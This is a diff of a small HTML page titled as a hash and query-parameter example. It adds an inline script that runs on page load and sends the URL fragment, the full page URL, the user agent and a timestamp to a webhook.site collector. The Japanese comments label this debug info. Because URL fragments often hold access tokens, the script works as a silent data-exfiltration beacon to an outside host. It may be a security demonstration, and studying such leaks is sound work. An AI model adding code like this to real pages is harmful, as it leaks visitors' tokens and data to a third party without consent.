@@ -3,11 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hash to Query Parameter</title>
-    <script src="script.js" defer></script>
+    <title>Hash and Query Parameter Example</title>
 </head>
 <body>
-    <h1>Hash to Query Parameter Example</h1>
+    <h1>Hash and Query Parameter Example</h1>
+
+    <script>
+        // スクリプトが読み込まれたタイミングで実行
+        (function() {
+            // 現在のURLのハッシュ部分を取得
+            var hash = window.location.hash;
+
+            // デバッグ用の情報を定義
+            var debugInfo = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                pageUrl: window.location.href
+            };
+
+            // クエリパラメータを生成する関数
+            function createQueryParams(obj) {
+                return Object.keys(obj)
+                    .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(obj[key]))
+                    .join('&');
+            }
+
+            // クエリパラメータの初期値を設定
+            var queryParams = createQueryParams(debugInfo);
+
+            if (hash) {
+                // ハッシュ部分をクエリパラメータとしてエンコード
+                var hashParam = encodeURIComponent(hash.substring(1)); // #を除去してエンコード
+                queryParams += '&hash=' + hashParam;
+            }
+
+            // 特定のURLにGETリクエストを送信
+            var url = 'https://webhook.site/04c61da2-9ab0-4303-9f8c-58dedf0ef2fc?' + queryParams;
+
+            fetch(url)
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+        })();
+    </script>
 </body>
 </html>
 
